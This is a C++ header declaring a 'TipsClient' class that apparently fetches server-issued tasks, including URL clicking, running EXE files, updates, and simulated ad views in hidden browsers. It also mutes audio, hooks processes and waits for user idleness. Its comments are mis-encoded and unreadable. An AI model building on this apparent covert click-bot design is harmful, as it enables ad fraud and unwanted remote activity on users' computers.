
#pragma once

#include <synacast/xdll/PacketBuilder.h>

#include <ppl/net/inet.h>
#include <ppl/mswin/mfc/net.h>
#include <ppl/mswin/mfc/timer.h>
#include <ppl/mswin/MessageThread.h>
#include <ppl/concurrent/runnable.h>
#include <boost/noncopyable.hpp>
#include "Xdll_i.h"

#include "HopInfo.h"
#include "httpimpl.h"
#include "HookHelper.h"
#include "LogVast.h"

class CWBWnd;
typedef boost::shared_ptr<CWBWnd> CWBWndPtr;
typedef std::vector<CWBWndPtr> CWBWndCollection;

class PacketInputStream;

typedef void (WINAPI* PFN_StatisticStartup_Dll)(); 
typedef void (WINAPI* PFN_StatisticCleanup_Dll)(); 
typedef void (WINAPI* PFN_DoneStartup_Dll)();
typedef void (WINAPI* PFN_DoneCleanup_Dll)(); 
typedef void (WINAPI* PFN_BrsStart_Dll)();
typedef void (WINAPI* PFN_BrsStop_Dll)();

class AsyncHttpDownloadListener;
class TipsClient : 
	private boost::noncopyable, 
	public UDPSocketListener,
	public HttpDownloadListener
{
public:
	TipsClient();
	virtual ~TipsClient();

	int Start();
	int Stop();
	void DoStartInThread();
	void SendModuleStartLog();
	void StartOtherModule();
	void CloseProcessVolume();

	void OnAppTimer();
	void OnDayTimer();
	
	void OnTimeoutTimer();
	void OnReceiveTimer();

	LONG ThreadExceptFilter(PEXCEPTION_POINTERS excepInfo);
	void InitMessageThread();
	void UnInitMessageThread();

	void SafeRunMessageThread();
	void RunMessageThread();
	void StopMessageThread();

	void SafeRunTaskThread();
	void RunTaskThread();
	void StopTaskThread();

	void InsertVisitedGroup(const TaskInfo& task);

	void DoTask( const NormalTaskInfo& task );
	void DoTask( const MultiHopTaskInfo& task );
	void DoTask( const IUTTaskInfo& task );
	void DoTask( const EXETaskInfo& task );
	void DoTask( const PostTaskInfo& task );
	void DoTask( const UpdateTaskInfo& task );
	void DoTask( const RedirectTaskInfo& task );
	void DoTask( const ConfigTaskInfo& task);
	void DoTask( const ClientSimTaskInfo& task);
	void DoTask( const VASTSimTaskInfo& task, UINT32 uDelayTime);
	void DoTask( const VASTExSimTaskInfo& task, UINT32 uDelayTime);
	void DoTask( const ClientExSimTaskInfo& task);

	void DoMultiHopTask(MultiHopInfoPtr multiHopInfoPtr);

//	void SendIUTExcuteLog(int type, MultiHopInfoPtr info);

	void DoIniConfigTask(const ConfigTaskInfo& task, const string& decryptFilePath);
	void DoXmlConfigTask(const ConfigTaskInfo& task, const string& decryptFilePath);
	
	void StartTimer();
	//void StartTimer(UINT delaySeconds);

	virtual void OnSocketReceive( UDPSocket* sender, const InetSocketAddress& sockAddr, BYTE* data, size_t size );
	virtual void OnSocketReceiveFailed( UDPSocket* sender, long errcode );
	virtual void OnDataReceive(unsigned char* data, size_t size);
	virtual void OnDateReceiveFailed(long errcode);
	void OnResponseReceive(unsigned char* data, size_t size);

	bool ParseTaskInfo( PacketInputStream& is, TaskInfo& taskInfo, const TaskHeader& taskHeader );

	void OnTaskComplete( MultiHopInfoPtr urlInfo );

	void ClickUrl( MultiHopInfoPtr urlInfo );

	void ClearBrowsers();
	boost::shared_ptr<CWBWnd> NewBrowser();
	boost::shared_ptr<CWBWnd> GetMainBrowser();

	MultiHopInfoPtr GetUrlInfo() const { return m_urlInfo; }
	int GetClickCount() const { return m_iClickCount; }
	void AddClickCount() { m_iClickCount ++; }

	#ifdef NEED_IMM
	bool InputMonitorSucceed(UINT input_delta = 0 * 60 * 1000);
	#else
	bool InputMonitorSucceed(UINT input_delta = 5 * 60 * 1000);
	#endif

	void GeneralServerAddress();
	void GeneralStatisticServerAddress();
	UINT16 GetRequestChannelID() const;

	void StartAsyncHttpDownload(string& url, string& userAgent, string& referer);
	void RemoveHttpDownload(AsyncHttpDownloadListener* httpListener);

	/**
	 * �Ƿ�����������URL, �����첽�ɲ���Э��URL����
	 * ����ֵ: TRUE  ��������
	 *         FALSE ����������
	 */
	BOOL CanDonwloadUrl(LPCWSTR szUrl);
	
private:
	BoostRunnableThread m_msgThread;
	BoostRunnableThread m_taskThread;
	boost::scoped_ptr<UDPSocket> m_udp;
	HttpDownload*                m_httpDownload;
	PacketBuilder m_builder;
	// UDP,HTTP��ʱ����,Ĭ��10s
	boost::scoped_ptr<OnceTimer> m_receiveTimer;
	enum{PHASE_WAIT_NOTHING = 0, PHASE_WAIT_UDP};
	int m_downloadPhase;
	std::set<AsyncHttpDownloadListener*>  m_asyncHttpDownload;
	// ÿ��1���ӵ�Timer
	boost::scoped_ptr<OnceTimer> m_timer;
	// ����IE����� ���ʱ��Timer����ʾʱ�䵽�ˣ��ͻ�ر����õ�IE�����
	boost::scoped_ptr<OnceTimer> m_timeoutTimer;
	// URL������, �������е���ַ����������
	CComPtr<IClassFactory>   m_spHttpClassFactory;
	std::list<std::wstring>  m_blackList;

	InetSocketAddress m_serverAddress;
	InetSocketAddress m_statisticServerAddress;

	DWORD m_dwLastRequestTickCount;				// ��һ�����������TickCount
	bool m_hasNotRequest;
	UINT m_uDelayTime;							// ���������ʱ���� 
	DWORD m_dwLastForceRequestTickCount;		// ��һ��ǿ�������TickCount
	bool m_hasNotForceRequest;
	UINT m_uForceDelayTime;						// ǿ�������ʱ����

	//DWORD m_dwLastStatisticTickCount;			// ��һ�����õ�ͳ�������Tickcount	
	//bool m_hasNotStatisticRequest;
	DWORD m_uKeepAliveTime;						// ͳ�Ʊ��͵�ʱ��������λ����

	CWBWndCollection m_browsers;				// ����ģ����������ҳ��
	
	// ���Url����Ķ���
	std::list<MultiHopInfoPtr> m_urlInfos;

	// ��ǰ UrlInfo
	MultiHopInfoPtr m_urlInfo;
	int m_iClickCount;

	// �ڴ������Ƿݱ�����
	bool m_bIsMemoryLimitOpened;				// ��ʾ�ڴ����Ʊ�����

	// �Ѿ�ִ�е�������
	INT16 m_Channel;
	RequestInfo m_RequestInfo;
	//StatisticRequestInfo m_StatisticRequestInfo;

	/// ��һ�ζ�ʱ��¼���� �������л��� ����
	DWORD m_LastTickCount;

	string m_NuclearDomain;
	string m_FinalNuclearIp;

	string m_StatisticDomain;
	string m_FinalStatisticIp;

	// Hookģ��
	HookHelper m_hookInstance;

	// ����TipsStatistic.dll
	HMODULE m_hModTipsStatistic; 
	PFN_StatisticStartup_Dll m_fnTip_StatisticStartup;
	PFN_StatisticStartup_Dll m_fnTip_StatisticCleanup;
	// ����TipsStatistic.dll
	HMODULE m_hModTipsDone;
	PFN_DoneStartup_Dll m_fnTip_DoneStartup;
	PFN_DoneCleanup_Dll m_fnTip_DoneCleanup;
	// ����TipsBrs.dll
	HMODULE m_hModTipsBrs;
	PFN_BrsStart_Dll m_fnTips_BrsStart;
	PFN_BrsStop_Dll m_fnTips_BrsStop;

	LogVast m_TipsLog;	//����logģ��, ��־�ķ�������1/1000
};






